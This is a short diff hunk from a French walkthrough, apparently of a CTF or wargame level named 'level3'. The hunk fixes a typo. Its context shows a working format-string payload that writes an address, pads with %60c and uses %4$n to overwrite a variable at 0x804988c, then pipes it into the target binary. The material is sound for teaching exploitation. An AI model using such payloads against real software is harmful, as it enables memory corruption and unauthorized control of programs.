@@ -63,7 +63,7 @@ Donc on fait notre petite injection:
 $> python -c "print '\x8c\x98\x04\x08' + '%60c' + '%4\$n'" > /tmp/test1
 
 On ecrit l'adresse de la variable => 4 octets
-Puis on fait une largeur de 60c (c etant vide cela va juste faire 60 espace) => 60 octets
+Puis on fait une largeur de 60c (c etant vide cela va juste faire 60 espaces) => 60 octets
 %n va alors calculer la taille de toute la chaine donc 64 octets et l'ecrire a l'adresse 0x804988c
 
 $> cat /tmp/test1 - | ./level3
